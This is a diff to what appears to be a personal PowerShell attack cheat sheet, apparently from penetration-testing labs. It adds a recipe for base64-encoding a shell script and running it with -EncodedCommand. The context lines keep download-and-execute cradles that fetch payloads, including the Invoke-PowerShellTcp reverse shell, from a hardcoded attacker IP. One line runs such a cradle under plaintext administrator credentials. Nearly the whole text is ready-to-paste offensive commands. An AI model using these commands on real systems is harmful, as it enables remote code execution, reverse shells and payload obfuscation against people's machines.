@@ -18,6 +18,10 @@ powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112
 
 powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/powershell_attack.txt')
 
+#Encoded command powershell
+
+cat shell3 | iconv --to-code UTF-16LE |   base64 -w 0
+powershell -EncodedCommand JwBtAGkAawBlAGYAcgBvAGIAYgBpAG4AcwAuAGMAbwBtACcA
 
 
 #Calling a specific PowerShell function from the command line
@@ -51,7 +55,6 @@ powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112
 #Auto-Login
 
 $passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;$creds =New-Object System.Management.Automation.PSCredential('administrator', $passwd)
-
 
 Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.16.112/Invoke-PowerShellTcp.ps1')" -Credential $creds
 
